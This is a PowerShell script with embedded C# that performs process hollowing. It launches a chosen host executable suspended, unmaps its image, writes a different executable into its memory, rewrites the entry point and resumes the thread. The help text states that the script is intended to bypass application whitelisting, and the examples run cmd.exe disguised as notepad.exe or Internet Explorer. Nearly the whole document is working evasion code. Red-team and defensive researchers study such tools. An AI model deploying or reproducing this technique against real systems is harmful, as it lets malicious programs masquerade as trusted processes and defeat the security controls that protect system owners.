function Replace-x64-Process
{
<#
.Synopsis
 Replaces an arbitrary process with another process.

 Author: Matthew Graeber (@mattifestation)
 License: GNU GPL v2
.Description
 The Replace-x64-Process function loads a 64-bit executable of your choosing into a suspended state
 and replaces it with the target of your choosing. This function is intended to bypass application
 whitelisting products.
 
 Usage notes:
 - It is assumed that executing Powershell is allowed.
 - It is assumed that csc.exe (C-Sharp compiler) is allowed. A future release may obviate the need for
   csc.exe through the usage of the .NET Reflection class.
 - This does not work reliably in every case, most likely due to my lack of complete understanding of
   the loading process. I.E. Don't whine if it doesn't work unless you come bearing a potential solution.

.Parameter HostProcess
 Specifies the host process to load suspended and replace.

.Parameter With
 Specifies the target process that will replace the host process.
 
.Parameter Arguments
 Specifies any optional parameters to pass to the target process

.Notes
 echo 'Unconstructive complaints' > $null
 
 Please don't ask for help on how to execute a Powershell script such as this one. That's what the
 Interwebs are for.
 
.Example
 PS> Replace-x64-Process 'C:\Program Files\Internet Explorer\iexplore.exe' -With 'C:\Windows\System32\cmd.exe'

 Description
 -----------
 Loads Internet Explorer and replaces its executable image with that of cmd.exe.

.Example
 PS> Replace-x64-Process 'C:\Windows\System32\notepad.exe' -With 'C:\Windows\System32\cmd.exe' -Arguments '/c ping 127.0.0.1 -n 3 > C:\results.txt'

 Description
 -----------
 Loads notepad.exe and replaces its image with cmd.exe and executes ping as an argument.
.Link
 My blog: http://www.exploit-monday.com/
#>

    [CmdletBinding()] Param (
        [Parameter(Position = 0, Mandatory = $True)] [String] $HostProcess,
        [Parameter(Position = 1, Mandatory = $True)] [String] $With,
        [Parameter(Position = 2)] [String] $Arguments 
    )
    
Set-StrictMode -Version 2.0
$ErrorActionPreference = 'Stop'
    
$code = @"
    using System;
    using System.Runtime.InteropServices;
    
    public class Process
        {
            [Flags]
            public enum IMAGE_DOS_SIGNATURE : ushort
            {
                DOS_SIGNATURE =                 0x5A4D      // MZ
            }
            
            [Flags]
            public enum IMAGE_NT_SIGNATURE : uint
            {
                PE_SIGNATURE =                  0x00004550  // PE00
            }
            
            [Flags]
            public enum IMAGE_FILE_MACHINE : ushort
            {
                I386 =             0x014c,  // Intel 386.
                IA64 =             0x0200,  // Intel 64
                AMD64 =            0x8664,  // AMD64 (K8)
            }
            
            [Flags]
            public enum IMAGE_SCN : uint
            {
                TYPE_NO_PAD =               0x00000008,  // Reserved.
                CNT_CODE =                  0x00000020,  // Section contains code.
                CNT_INITIALIZED_DATA =      0x00000040,  // Section contains initialized data.
                CNT_UNINITIALIZED_DATA =    0x00000080,  // Section contains uninitialized data.
                LNK_INFO =                  0x00000200,  // Section contains comments or some other type of information.
                LNK_REMOVE =                0x00000800,  // Section contents will not become part of image.
                LNK_COMDAT =                0x00001000,  // Section contents comdat.
                NO_DEFER_SPEC_EXC =         0x00004000,  // Reset speculative exceptions handling bits in the TLB entries for this section.
                GPREL =                     0x00008000,  // Section content can be accessed relative to GP
                MEM_FARDATA =               0x00008000,
                MEM_PURGEABLE =             0x00020000,
                MEM_16BIT =                 0x00020000,
                MEM_LOCKED =                0x00040000,
                MEM_PRELOAD =               0x00080000,
                ALIGN_1BYTES =              0x00100000,  //
                ALIGN_2BYTES =              0x00200000,  //
                ALIGN_4BYTES =              0x00300000,  //
                ALIGN_8BYTES =              0x00400000,  //
                ALIGN_16BYTES =             0x00500000,  // Default alignment if no others are specified.
                ALIGN_32BYTES =             0x00600000,  //
                ALIGN_64BYTES =             0x00700000,  //
                ALIGN_128BYTES =            0x00800000,  //
                ALIGN_256BYTES =            0x00900000,  //
                ALIGN_512BYTES =            0x00A00000,  //
                ALIGN_1024BYTES =           0x00B00000,  //
                ALIGN_2048BYTES =           0x00C00000,  //
                ALIGN_4096BYTES =           0x00D00000,  //
                ALIGN_8192BYTES =           0x00E00000,  //
                ALIGN_MASK =                0x00F00000,
                LNK_NRELOC_OVFL =           0x01000000,  // Section contains extended relocations.
                MEM_DISCARDABLE =           0x02000000,  // Section can be discarded.
                MEM_NOT_CACHED =            0x04000000,  // Section is not cachable.
                MEM_NOT_PAGED =             0x08000000,  // Section is not pageable.
                MEM_SHARED =                0x10000000,  // Section is shareable.
                MEM_EXECUTE =               0x20000000,  // Section is executable.
                MEM_READ =                  0x40000000,  // Section is readable.
                MEM_WRITE =                 0x80000000  // Section is writeable.
            }
            
            [StructLayout(LayoutKind.Explicit, Size=0x4d0)]
            public struct _CONTEXT64
            {
                [FieldOffset(0x0)] public ulong P1Home;
                [FieldOffset(0x8)] public ulong P2Home;
                [FieldOffset(0x10)] public ulong P3Home;
                [FieldOffset(0x18)] public ulong P4Home;
                [FieldOffset(0x20)] public ulong P5Home;
                [FieldOffset(0x28)] public ulong P6Home;
                [FieldOffset(0x30)] public uint ContextFlags;
                [FieldOffset(0x34)] public uint MxCsr;
                [FieldOffset(0x38)] public ushort SegCs;
                [FieldOffset(0x3a)] public ushort SegDs;
                [FieldOffset(0x3c)] public ushort SegEs;
                [FieldOffset(0x3e)] public ushort SegFs;
                [FieldOffset(0x40)] public ushort SegGs;
                [FieldOffset(0x42)] public ushort SegSs;
                [FieldOffset(0x44)] public uint EFlags;
                [FieldOffset(0x48)] public ulong Dr0;
                [FieldOffset(0x50)] public ulong Dr1;
                [FieldOffset(0x58)] public ulong Dr2;
                [FieldOffset(0x60)] public ulong Dr3;
                [FieldOffset(0x68)] public ulong Dr6;
                [FieldOffset(0x70)] public ulong Dr7;
                [FieldOffset(0x78)] public ulong Rax;
                [FieldOffset(0x80)] public ulong Rcx;
                [FieldOffset(0x88)] public ulong Rdx;
                [FieldOffset(0x90)] public ulong Rbx;
                [FieldOffset(0x98)] public ulong Rsp;
                [FieldOffset(0xa0)] public ulong Rbp;
                [FieldOffset(0xa8)] public ulong Rsi;
                [FieldOffset(0xb0)] public ulong Rdi;
                [FieldOffset(0xb8)] public ulong R8;
                [FieldOffset(0xc0)] public ulong R9;
                [FieldOffset(0xc8)] public ulong R10;
                [FieldOffset(0xd0)] public ulong R11;
                [FieldOffset(0xd8)] public ulong R12;
                [FieldOffset(0xe0)] public ulong R13;
                [FieldOffset(0xe8)] public ulong R14;
                [FieldOffset(0xf0)] public ulong R15;
                [FieldOffset(0xf8)] public ulong Rip;
                [MarshalAs(UnmanagedType.ByValArray, SizeConst = 976)] 
                [FieldOffset(0x100)] public byte[] ExtendedRegisters;
            }
        
            [StructLayout(LayoutKind.Sequential, Pack = 1)]
            public struct PROCESS_BASIC_INFORMATION
            {
              public IntPtr ExitStatus;
              public IntPtr PebBaseAddress;
              public IntPtr AffinityMask;
              public IntPtr BasePriority;
              public IntPtr UniqueProcessId;
              public IntPtr InheritedFromUniqueProcessId;

              public int Size
              {
                get { return (int)Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION)); }
              }
            }
            
            [StructLayout(LayoutKind.Sequential, Pack=1)]
            public struct _IMAGE_DOS_HEADER
            {
                public IMAGE_DOS_SIGNATURE   e_magic;        // Magic number
                public ushort   e_cblp;                      // public bytes on last page of file
                public ushort   e_cp;                        // Pages in file
                public ushort   e_crlc;                      // Relocations
                public ushort   e_cparhdr;                   // Size of header in paragraphs
                public ushort   e_minalloc;                  // Minimum extra paragraphs needed
                public ushort   e_maxalloc;                  // Maximum extra paragraphs needed
                public ushort   e_ss;                        // Initial (relative) SS value
                public ushort   e_sp;                        // Initial SP value
                public ushort   e_csum;                      // Checksum
                public ushort   e_ip;                        // Initial IP value
                public ushort   e_cs;                        // Initial (relative) CS value
                public ushort   e_lfarlc;                    // File address of relocation table
                public ushort   e_ovno;                      // Overlay number
                [MarshalAsAttribute(UnmanagedType.ByValArray, SizeConst=4)] // , ArraySubType=UnmanagedType.U4
                public ushort[] e_res;                       // Reserved public ushorts
                public ushort   e_oemid;                     // OEM identifier (for e_oeminfo)
                public ushort   e_oeminfo;                   // OEM information; e_oemid specific
                [MarshalAsAttribute(UnmanagedType.ByValArray, SizeConst=10)] // , ArraySubType=UnmanagedType.U4
                public ushort[] e_res2;                      // Reserved public ushorts
                public int      e_lfanew;                    // File address of new exe header
            }
            
            [StructLayout(LayoutKind.Sequential, Pack=1)]
            public struct _IMAGE_FILE_HEADER
            {
                public IMAGE_FILE_MACHINE    Machine;
                public ushort                NumberOfSections;
                public uint                  TimeDateStamp;
                public uint                  PointerToSymbolTable;
                public uint                  NumberOfSymbols;
                public ushort                SizeOfOptionalHeader;
                public ushort                Characteristics;
            }
            
            [StructLayout(LayoutKind.Sequential, Pack=1)]
            public struct _IMAGE_NT_HEADERS64
            {
                public IMAGE_NT_SIGNATURE Signature;
                public _IMAGE_FILE_HEADER FileHeader;
                public _IMAGE_OPTIONAL_HEADER64 OptionalHeader;
            }
            
            [StructLayout(LayoutKind.Sequential, Pack=1)]
            public struct _IMAGE_OPTIONAL_HEADER64
            {
                public ushort    Magic;
                public byte      MajorLinkerVersion;
                public byte      MinorLinkerVersion;
                public uint      SizeOfCode;
                public uint      SizeOfInitializedData;
                public uint      SizeOfUninitializedData;
                public uint      AddressOfEntryPoint;
                public uint      BaseOfCode;
                public IntPtr    ImageBase;
                public uint      SectionAlignment;
                public uint      FileAlignment;
                public ushort    MajorOperatingSystemVersion;
                public ushort    MinorOperatingSystemVersion;
                public ushort    MajorImageVersion;
                public ushort    MinorImageVersion;
                public ushort    MajorSubsystemVersion;
                public ushort    MinorSubsystemVersion;
                public uint      Win32VersionValue;
                public uint      SizeOfImage;
                public uint      SizeOfHeaders;
                public uint      CheckSum;
                public ushort    Subsystem;
                public ushort    DllCharacteristics;
                public ulong     SizeOfStackReserve;
                public ulong     SizeOfStackCommit;
                public ulong     SizeOfHeapReserve;
                public ulong     SizeOfHeapCommit;
                public uint      LoaderFlags;
                public uint      NumberOfRvaAndSizes;
                [MarshalAsAttribute(UnmanagedType.ByValArray, SizeConst=16)]
                public _IMAGE_DATA_DIRECTORY[] DataDirectory;
            }
            
            [StructLayout(LayoutKind.Sequential, Pack=1)]
            public struct _IMAGE_DATA_DIRECTORY
            {
                public uint      VirtualAddress;
                public uint      Size;
            }
            
            [StructLayout(LayoutKind.Sequential, Pack=1)]
            public struct _IMAGE_SECTION_HEADER
            {
                [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 8)]
                public string Name;
                public uint VirtualSize;
                public uint VirtualAddress;
                public uint SizeOfRawData;
                public uint PointerToRawData;
                public uint PointerToRelocations;
                public uint PointerToLinenumbers;
                public ushort NumberOfRelocations;
                public ushort NumberOfLinenumbers;
                public IMAGE_SCN Characteristics;
            }
        
            [DllImport("kernel32.dll")]
            public static extern IntPtr OpenThread(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);
            [DllImport("kernel32.dll")]
            public static extern bool GetThreadContext(IntPtr hThread, ref _CONTEXT64 lpContext);
            [DllImport("kernel32.dll")]
            public static extern bool SetThreadContext(IntPtr hThread, ref _CONTEXT64 lpContext);
            [DllImport("kernel32.dll")]
            public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
            [DllImport("ntdll.dll")]
            public static extern uint NtQueryInformationProcess(IntPtr hProcess, uint ProcessInformationClass, ref PROCESS_BASIC_INFORMATION ProcessInformation, uint ProcessInformationLength, [Out] uint ReturnLength);
            [DllImport("kernel32.dll")]
            public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out, MarshalAs(UnmanagedType.AsAny)] object lpBuffer, int dwSize, [Out] int lpNumberOfBytesRead);
            [DllImport("ntdll.dll")]
            public static extern uint ZwUnmapViewOfSection(IntPtr ProcessHandle, IntPtr BaseAddress);
            [DllImport("kernel32.dll")]
            public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
            [DllImport("kernel32.dll")]
            public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, [Out] IntPtr lpNumberOfBytesWritten);
            [DllImport("kernel32.dll")]
            public static extern uint ResumeThread(IntPtr hThread);
        }
"@

$location = [PsObject].Assembly.Location
$compileParams = New-Object System.CodeDom.Compiler.CompilerParameters
$assemblyRange = @("System.dll", $location)
$compileParams.ReferencedAssemblies.AddRange($assemblyRange)
$compileParams.GenerateInMemory = $True
Add-Type -TypeDefinition $code -CompilerParameters $compileParams -passthru | Out-Null

if (!$Arguments)
{
    $Arguments = ' '
}

# Determine processor architecture
$ProcessorArch = (Get-WmiObject Win32_Processor AddressWidth).AddressWidth

# Only compatible on 64-bit processors in 64-bit Powershell
if ($ProcessorArch -eq 32) {
    Write-Warning "This script is only compatible with 64-bit processors."
    break
} elseif (($ProcessorArch -eq 64) -And ([IntPtr]::Size -eq 4)) {
    Write-Warning "You must run this script from 64-bit Powershell."
    break
}

Write-Verbose "Processor address width: $ProcessorArch"

# Determine is host process is 32 or 64-bit executable
[Byte[]] $HostFileBytes = [System.IO.File]::ReadAllBytes($HostProcess)
$HostFileHandle = [System.Runtime.InteropServices.GCHandle]::Alloc($HostFileBytes, [System.Runtime.InteropServices.GCHandleType]::Pinned)
$HostFileAddr = $HostFileHandle.AddrOfPinnedObject()
$HostDosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($HostFileAddr, [Process+_IMAGE_DOS_HEADER])
$HostPointerNtHeader = [IntPtr] ($HostFileAddr.ToInt64() + $HostDosHeader.e_lfanew)
$HostNtHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($HostPointerNtHeader, [Process+_IMAGE_NT_HEADERS64])
$HostFileHandle.Free()
            
if ($HostNtHeader.FileHeader.Machine.ToString() -eq 'I386') {
    $HostIs32BitProcess = $true
    Write-Verbose 'Host is a 32-bit process.'
} else {
    $HostIs32BitProcess = $false
    Write-Verbose 'Host is a 64-bit process.'
}

[Byte[]] $TargetFileBytes = [System.IO.File]::ReadAllBytes($With)
$TargetFileHandle = [System.Runtime.InteropServices.GCHandle]::Alloc($TargetFileBytes, [System.Runtime.InteropServices.GCHandleType]::Pinned)
$TargetFileAddr = $TargetFileHandle.AddrOfPinnedObject()
$TargetDosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TargetFileAddr, [Process+_IMAGE_DOS_HEADER])
$TargetPointerNtHeader = [IntPtr] ($TargetFileAddr.ToInt64() + $TargetDosHeader.e_lfanew)
$TargetNtHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TargetPointerNtHeader, [Process+_IMAGE_NT_HEADERS64])

# Check for valid PE executable
if (($TargetDosHeader.e_magic -ne [Process+IMAGE_DOS_SIGNATURE]::DOS_SIGNATURE) -Or ($TargetNtHeader.Signature -ne [Process+IMAGE_NT_SIGNATURE]::PE_SIGNATURE))
{
    Write-Warning "Attempt to load a non-valid executable!"
    break
}

# Determine is target process is 32 or 64-bit executable
if ($TargetNtHeader.FileHeader.Machine.ToString() -eq 'I386') {
    $TargetIs32BitProcess = $true
    Write-Verbose "Target is a 32-bit process."
} else {
    $TargetIs32BitProcess = $false
    Write-Verbose "Target is a 64-bit process."
}

if (!($HostIs32BitProcess) -And $TargetIs32BitProcess) {
    Write-Warning "Attempt to replace a 64-bit process with a 32-bit process!"
    break
}
if ($HostIs32BitProcess -And !($TargetIs32BitProcess)) {
    Write-Warning "Attempt to replace a 32-bit process with a 64-bit process!"
    break
}

# Start the host process suspended
$ProcessStartup = [WmiClass] "Win32_ProcessStartup"
$ProcessStartup.Properties | Where-Object {$_.Name -eq 'CreateFlags'} | % {$_.Value = 4}
$Proc = Invoke-WmiMethod -Path Win32_Process -Name Create -ArgumentList "$($HostProcess) $($Arguments)", $null, ([WmiClass] $ProcessStartup)
Write-Verbose "PID $($Proc.ProcessId) suspended."
$Proc = Get-Process -Id $Proc.ProcessId
$MainThread = $Proc.Threads[0]

# Get a handle to the main thread with sufficient privileges
# 0x10 = GET_CONTEXT | 0x08 = SET_CONTEXT | 0x40 = THREAD_QUERY_INFORMATION | 0x02 = THREAD_SUSPEND_RESUME
$hThread = [Process]::OpenThread(0x5A, $false, $MainThread.Id)

# Get the context of the main thread
$Context = New-Object Process+_CONTEXT64
$Context.ContextFlags = 0x0010003F # CONTEXT_ALL (AMD64)
[Process]::GetThreadContext($hThread, [ref] $Context) | Out-Null

# Get the PEB address of the host process
$hProcess = [Process]::OpenProcess(0x001F0FFF, 0, $Proc.Id) # 0x001F0FFF = All access
$pbi = New-Object Process+PROCESS_BASIC_INFORMATION
[Process]::NtQueryInformationProcess($hProcess, 0, [ref] $pbi, $pbi.Size, $null) | Out-Null
# Find image base address as an offset in to PEB
$pImageBaseAddress = [IntPtr] ($pbi.PebBaseAddress.ToInt64() + ([IntPtr]::Size * 2))
$ImageBaseAddress = New-Object IntPtr
[Process]::ReadProcessMemory($hProcess, $pImageBaseAddress, $ImageBaseAddress, [IntPtr]::Size, $null) | Out-Null
Write-Verbose "Old image base address: 0x$($ImageBaseAddress.ToString("X$([IntPtr]::Size * 2)"))"
# Unmap the image of the target executable
[Process]::ZwUnmapViewOfSection($hProcess, $ImageBaseAddress) | Out-Null

Write-Verbose ($Context | Out-String)
Write-Verbose ($TargetNtHeader.FileHeader | Out-String)
Write-Verbose ($TargetNtHeader.OptionalHeader | Out-String)
Write-Verbose ($pbi | Out-String)

$NumSections = $TargetNtHeader.FileHeader.NumberOfSections
$OptionalHeaderSize = $TargetNtHeader.FileHeader.SizeOfOptionalHeader
$TargetPointerOptionalHeader = [IntPtr] ($TargetPointerNtHeader.ToInt64() + 4 + [System.Runtime.InteropServices.Marshal]::SizeOf([Process+_IMAGE_FILE_HEADER]))
# Calculate offset to the section header
$TargetFileAddrSectionHeader = [IntPtr] ($TargetPointerOptionalHeader.ToInt64() + $OptionalHeaderSize)

# Process each section header of the host process
$SectionHeaders = New-Object Process+_IMAGE_SECTION_HEADER[]($NumSections)
foreach ($i in 0..($NumSections - 1))
{
    $SectionHeaders[$i] = [System.Runtime.InteropServices.Marshal]::PtrToStructure(([IntPtr] ($TargetFileAddrSectionHeader.ToInt64() + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Process+_IMAGE_SECTION_HEADER])))), [Process+_IMAGE_SECTION_HEADER])
    Write-Verbose ($SectionHeaders[$i] | Out-String)
}

# Allocate space for the target process
$pBase = [Process]::VirtualAllocEx($hProcess, $TargetNtHeader.OptionalHeader.ImageBase, $TargetNtHeader.OptionalHeader.SizeOfImage, 0x3000, 0x40)
Write-Verbose "New image base address: 0x$($pBase.ToString("X$([IntPtr]::Size * 2)"))"

# Write out the new PE header
[Process]::WriteProcessMemory($hProcess, $pBase, $TargetFileAddr, $TargetNtHeader.OptionalHeader.SizeOfHeaders, 0) | Out-Null

$AddressOfEntryPoint = [IntPtr] ($pBase.ToInt64() + $TargetNtHeader.OptionalHeader.AddressOfEntryPoint)
Write-Verbose "Address of new entry point: 0x$($AddressOfEntryPoint.ToString("X$([IntPtr]::Size * 2)"))"

# Write out each section of the host process to virtual memory
foreach ($i in 0..($NumSections - 1))
{
    $SectionBase = [IntPtr] ($pBase.ToInt64() + $SectionHeaders[$i].VirtualAddress)
    $lpBaseAddress = [IntPtr] ($TargetFileAddr.ToInt64() + $SectionHeaders[$i].PointerToRawData)
    [Process]::WriteProcessMemory($hProcess, $SectionBase, $lpBaseAddress, $SectionHeaders[$i].VirtualSize, 0) | Out-Null
}

# Overwrite the old PEB ImageBase address with the new one
$ProcessBaseAddrHandle = [System.Runtime.InteropServices.GCHandle]::Alloc($pBase, [System.Runtime.InteropServices.GCHandleType]::Pinned)
[Process]::WriteProcessMemory($hProcess, $pImageBaseAddress, $ProcessBaseAddrHandle.AddrOfPinnedObject(), [IntPtr]::Size, 0) | Out-Null

# In 64-bit applications, the PEB address is loaded in Rdx
# 32-bit EP:EAX, PEB:EBX vs. 64-bit EP:RCX, PEB:RDX
$Context.Rcx = $AddressOfEntryPoint.ToInt64()
[Process]::SetThreadContext($hThread, [ref] $Context) | Out-Null

Write-Verbose "Resuming PID $($Proc.Id)."
[Process]::ResumeThread($hThread) | Out-Null
$TargetFileHandle.Free()

}

